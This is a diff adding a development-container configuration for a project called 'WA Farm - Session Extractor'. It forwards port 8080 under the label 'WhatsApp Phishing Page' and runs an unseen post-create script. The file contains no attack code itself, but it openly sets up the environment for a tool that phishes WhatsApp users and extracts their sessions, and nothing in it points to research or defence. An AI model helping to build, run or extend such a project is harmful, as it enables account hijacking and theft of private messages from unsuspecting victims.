@@ -1,0 +1,23 @@
+{
+    "name": "WA Farm - Session Extractor",
+    "build": {
+        "dockerfile": "../Dockerfile"
+    },
+    "forwardPorts": [8080],
+    "portsAttributes": {
+        "8080": {
+            "label": "WhatsApp Phishing Page",
+            "onAutoForward": "notify",
+            "requireLocalPort": false
+        }
+    },
+    "postCreateCommand": "bash .devcontainer/post-create.sh",
+    "customizations": {
+        "vscode": {
+            "extensions": [
+                "golang.go",
+                "ms-azuretools.vscode-docker"
+            ]
+        }
+    }
+}
